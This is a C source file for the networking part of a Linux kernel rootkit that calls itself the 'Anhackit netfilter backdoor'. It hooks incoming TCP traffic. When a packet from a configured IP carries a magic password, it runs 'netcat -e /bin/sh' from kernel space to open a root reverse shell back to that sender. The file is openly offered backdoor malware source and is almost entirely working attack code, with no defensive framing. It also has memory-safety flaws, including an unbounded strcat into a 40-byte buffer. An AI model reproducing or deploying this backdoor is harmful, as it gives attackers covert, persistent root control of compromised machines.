#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/kmod.h>
#include <linux/cred.h>
#include <linux/kallsyms.h>
#include <linux/delay.h>
#include <linux/version.h>
#include <linux/syscalls.h>
#include <linux/sched.h>
#include <linux/slab.h>
#include <asm/errno.h>

/*
    Anhackit netfilter backdoor - Developed by Anhackin

    Call load_magic_packet_hook to add a filter that will
    send back a reverse shell when a magic packet is found
*/

//Load config file
#include "conf.h"

//Net filter hook
static struct nf_hook_ops anhackit_hook_options;

//Kernel memory free (Required for call_usermodehelper_setup KERNEL_VERSION >= 3.4.0)
static void kfree_argv(struct subprocess_info *info) {
    kfree(info->argv);
}

//Run command in user mode
int run_command(char *run_cmd) {
    //Subprocess vars
    struct subprocess_info *info;
    char *cmd_string;
    static char *envp[] = {
        "HOME=/", "TERM=linux", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL
    };

    //Alloc argv
    char **argv = kmalloc(sizeof(char *[5]), GFP_KERNEL);
    if(!argv)
        goto out;

    //Check command string
    cmd_string = kstrdup(run_cmd, GFP_KERNEL);
    if(!cmd_string)
      goto free_argv;

    //Build argv
    argv[0] = "/bin/sh";
    argv[1] = "-c";
    argv[2] = run_cmd;
    argv[3] = NULL;

    //Setup subprocess (call_usermodehelper_setup updated in 3.4.0)
    #if (LINUX_VERSION_CODE < KERNEL_VERSION(3,4,0)) && (LINUX_VERSION_CODE > KERNEL_VERSION(3,1,0))
        info = call_usermodehelper_setup(argv[0], argv, envp, GFP_KERNEL);
    #endif
    #if LINUX_VERSION_CODE >= KERNEL_VERSION(3,4,0)
        info = call_usermodehelper_setup(argv[0], argv, envp, GFP_KERNEL, NULL, kfree_argv, NULL);
    #endif

    //Sanity check
    if(!info)
        goto free_cmd_string;

    //Run subprocess
    return call_usermodehelper_exec(info, UMH_WAIT_EXEC);

    //Free cmd_string
    free_cmd_string:
        kfree(cmd_string);
    //Free argv
    free_argv:
        kfree(argv);
    //Exit
    out:
        return -ENOMEM;
}

//Packet sniffer
static unsigned int magic_packet_hook(const struct nf_hook_ops *ops, struct sk_buff *skb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *)) {
    //Packet vars
    struct iphdr *iph;
    struct tcphdr *tcph;
    char *payload;

    //Buffer error
    if(!skb)
        return NF_ACCEPT;

    //Get ip & tcp headers
    iph = ip_hdr(skb);
    tcph = tcp_hdr(skb);

    //Headers or protocol error
    if(!iph || !tcph || iph->protocol != IPPROTO_TCP)
        return NF_ACCEPT;

    //Extract payload
    int payload_offset = iph->ihl*4+tcph->doff*4;
    int payload_length = skb->len-payload_offset;
    payload = kmalloc(payload_length+1, GFP_ATOMIC);
    skb_copy_bits(skb, payload_offset, (void*)payload, payload_length);

    //Convert source ip to string
    char ip[16];
    snprintf(ip, 16, "%pI4", &iph->saddr);

    //Convert destination port to string
    char port[6];
    sprintf(port, "%u", ntohs(tcph->dest));

    //Looking for magic packet
    if(!(strstr(payload, magic_password) && strstr(ip, magic_ip))) {
        return NF_ACCEPT;
    }

    //Debug
    #ifdef DEBUG
        printk("anhackit - magic packet found!\n");
        printk("anhackit - magic payload: %s\n", payload);
        printk("anhackit - send reverse shell to %s:%s...\n", ip, port);
    #endif

    //Send reverse shell
    char cmd[40];
    strcpy(cmd, "netcat -e /bin/sh ");
    strcat(cmd, ip);
    strcat(cmd, " ");
    strcat(cmd, port);
    run_command(cmd);

    return NF_ACCEPT;
}

//Load magic packet hook
void load_magic_packet_hook(void) {
    anhackit_hook_options.hook = (void *) magic_packet_hook;
    anhackit_hook_options.hooknum = 0;
    anhackit_hook_options.pf = PF_INET;
    anhackit_hook_options.priority = NF_IP_PRI_FIRST;

    nf_register_hook(&anhackit_hook_options);
}

//Unload magic packet hook
void unload_magic_packet_hook(void) {
    nf_unregister_hook(&anhackit_hook_options);
}
